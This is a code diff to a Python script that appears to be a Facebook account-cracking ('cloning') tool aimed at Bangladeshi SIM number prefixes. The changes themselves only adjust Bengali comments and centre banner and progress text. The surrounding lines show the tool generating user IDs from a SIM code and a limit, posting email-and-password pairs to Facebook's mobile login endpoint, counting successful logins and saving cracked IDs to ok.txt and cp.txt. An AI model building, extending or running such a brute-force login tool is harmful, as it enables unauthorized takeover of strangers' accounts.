@@ -11,7 +11,7 @@ O = '\033[1;38;5;208m' # Orange
 
 def banner():
     os.system('clear')
-    # META লোগো মাঝামাঝি রাখার জন্য স্পেস বাড়ানো হয়েছে
+    # META লোগোটি একদম মাঝখানে সেট করা হয়েছে
     print(f"""
 {R}                ███    ███  ███████  ████████  █████  
 {G}                ████  ████  ██          ██    ██   ██ 
@@ -49,13 +49,11 @@ def main():
         main()
 
 def cloning_start():
-    # BD CODE সেকশন
     print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
     print(f'{R}[•] {G}BD CODE- -> {G}016 {G}017 {G}018 {G}019{W}')
     print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
     code = input(f'{G}[+] ENTER SIM CODE: {W}')
     
-    # আপনার চাওয়া অনুযায়ী কালারফুল লিমিট সেকশন
     print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
     print(f'{R}[•] {G}EXAMPLE : [ {Y}10000{G}, {O}20000{G}, {G}50000 {G}]{W}')
     print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
@@ -85,7 +83,8 @@ def cloning_start():
         data = {'email': uid, 'pass': pws}
         url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
         
-        sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{ok}]'); sys.stdout.flush()
+        # মিটারটি মাঝখানে রাখার জন্য সঠিক স্পেস দেওয়া হয়েছে
+        sys.stdout.write(f'\r{G}      [MALEK-RUNNING] {loop}/{limit} [OK:{ok}]'); sys.stdout.flush()
 
         try:
             response = requests.post(url, headers=headers, data=data, timeout=5)
@@ -108,7 +107,7 @@ def cloning_start():
     print(f'{G}[+] CRACK PROCESS COMPLETED')
     print(f'[+] IDS SAVED IN ok.txt,cp.txt')
     print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
-    input(f'\n{G} [ BACK ]{W}')
+    input(f'\n           {G} [ BACK ]{W}')
     main()
 
 if __name__ == "__main__":
